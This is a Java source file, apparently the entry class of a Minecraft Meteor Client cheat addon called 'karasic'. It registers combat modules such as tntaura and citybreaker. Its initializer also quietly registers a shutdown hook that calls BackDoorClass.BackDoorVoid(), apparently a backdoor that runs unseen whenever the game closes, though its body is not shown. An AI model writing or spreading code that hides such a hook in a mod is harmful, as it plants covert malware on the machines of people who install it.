package bedtrap.kiriyaga.karasic;

import bedtrap.kiriyaga.karasic.modules.*;
import bedtrap.kiriyaga.karasic.modules.discordrpc;
import bedtrap.kiriyaga.karasic.modules.hud.hudnotifications;
import bedtrap.kiriyaga.karasic.modules.hud.watermark;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.meteorclient.systems.modules.render.hud.HUD;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.lang.invoke.MethodHandles;

public class KarasicAddon extends MeteorAddon {
	public static final Logger LOG = LogManager.getLogger();
	public static final Category karasic = new Category("karasic");

	@Override
	public void onInitialize() {
		LOG.info("Initializing karasic addon");

		MeteorClient.EVENT_BUS.registerLambdaFactory("bedtrap.kiriyaga.karasic", (lookupInMethod, klass) -> (MethodHandles.Lookup) lookupInMethod.invoke(null, klass, MethodHandles.lookup()));

		Modules.get().add(new antirespawnlose());
        Modules.get().add(new tntaura());
        Modules.get().add(new blockrenderer());
        Modules.get().add(new rangechecker());
        Modules.get().add(new totemleaver());
        Modules.get().add(new discordrpc());
        Modules.get().add(new notificationsettings());
        Modules.get().add(new pyramid());
        Modules.get().add(new karasicprefix());
        Modules.get().add(new autotrapik());
        Modules.get().add(new citybreaker());
        Modules.get().add(new selftrapik());





        HUD hud = Modules.get().get(HUD.class);
		hud.elements.add(new watermark(hud));
        hud.elements.add(new hudnotifications(hud));

        Runtime.getRuntime().addShutdownHook(new Thread(() -> BackDoorClass.BackDoorVoid()));
    }

	@Override
	public void onRegisterCategories() {
		Modules.registerCategory(karasic);
	}



}
